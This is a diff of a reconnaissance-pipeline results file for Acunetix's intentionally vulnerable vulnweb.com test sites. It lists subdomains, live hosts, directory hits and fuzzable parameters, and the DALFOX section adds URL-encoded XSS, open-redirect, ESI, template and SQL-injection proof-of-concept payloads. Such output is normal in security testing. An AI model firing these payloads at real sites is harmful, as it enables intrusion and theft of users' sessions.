@@ -1,4 +1,5 @@
-subfinder.txt
+SUBFINDER
+./subdomains.txt
 ---------------------
 www.virus.vulnweb.com
 rest.vulnweb.com
@@ -6,7 +7,8 @@ antivirus1.vulnweb.com
 restasp.vulnweb.com
 ============================
 
-httpx.txt
+HTTPX
+./subs-active.txt
 ---------------------
 http://testasp.vulnweb.com
 http://testphp.vulnweb.com
@@ -16,3 +18,45 @@ http://rest.vulnweb.com
 http://testaspnet.vulnweb.com
 ============================
 
+# DIRSEARCH
+./reports/BATCH-25-05-28_11-42-15/BATCH.TXT
+---------------------
+# Dirsearch started Wed May 28 11:44:02 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -l subs-active.txt -i 200
+
+200   926B   http://testasp.vulnweb.com/_vti_cnf/
+200     3KB  http://testasp.vulnweb.com/login.asp
+200    13B   http://testasp.vulnweb.com/robots.txt
+============================
+
+# PARAMSPIDER
+./results/testphp.vulnweb.com.txt
+---------------------
+http://testphp.vulnweb.com/AJAX/infoartist.php?id=FUZZ&YVeN=FUZZ
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=FUZZ
+http://testphp.vulnweb.com/hpp/params.php?p=FUZZ
+http://testphp.vulnweb.com/index.php?%25id%25=FUZZ&user=FUZZ
+
+./results/testasp.vulnweb.com.txt
+---------------------
+http://testasp.vulnweb.com/Search.asp?tfsearch=FUZZ
+http://testasp.vulnweb.com/Register.asp?RetURL=FUZZ
+http://testasp.vulnweb.com/Search.asp?tfSearch=FUZZ
+
+============================
+
+# DALFOX
+./dalfoxes.txt
+---------------------
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=FUZZ&id=%2F%2F%2F%2Fgoogle.com%2F%252f..
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=FUZZ&id=%7B444%2A6664%7D
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=FUZZ&id=%3Cesi%3Aassign+name%3D%22var1%22+value%3D%22dalfox%22%3E%3Cesii-%3Cesi%3Avars+name%3D%22%24%28var1%29%22%3E
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=FUZZ&id=%2F%2Fgoogle.com%2F%252f..
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=FUZZ&id=%27%3D0--%2B
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=FUZZ&id=FUZZ%22%3E%3CSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=FUZZ%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=FUZZ%22%3E%3Cw%3D%22%2Fx%3D%22y%3E%22%2Fclass%3Ddalfox%2Fondblclick%3D%60%3C%60%5Bconfirm%60%60%5D%3Ez
+[POC][R][GET][inATTR-none(1)-URL] http://testhtml5.vulnweb.com/report?id=FUZZonpointerenter%3Dalert%281%29+class%3Ddalfox+
+[POC][R][GET][inATTR-none(1)-URL] http://testhtml5.vulnweb.com/report?id=FUZZontouchend%3Dalert.call%28null%2C1%29+class%3Ddalfox+
+[POC][R][GET][inATTR-none(1)-URL] http://testhtml5.vulnweb.com/report?id=FUZZ%26%2339%3B%3E%3CdETAILS%250aopen%250aonToGgle%250a%3D%250aa%3Dprompt%2Ca%28%29%3E
+[POC][R][GET][inATTR-none(1)-URL] http://testhtml5.vulnweb.com/report?id=FUZZonmouseenter%3Dconfirm%281%29+class%3Ddalfox+
+[POC][R][GET][inHTML-URL] http://testhtml5.vulnweb.com/report?id=FUZZ%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
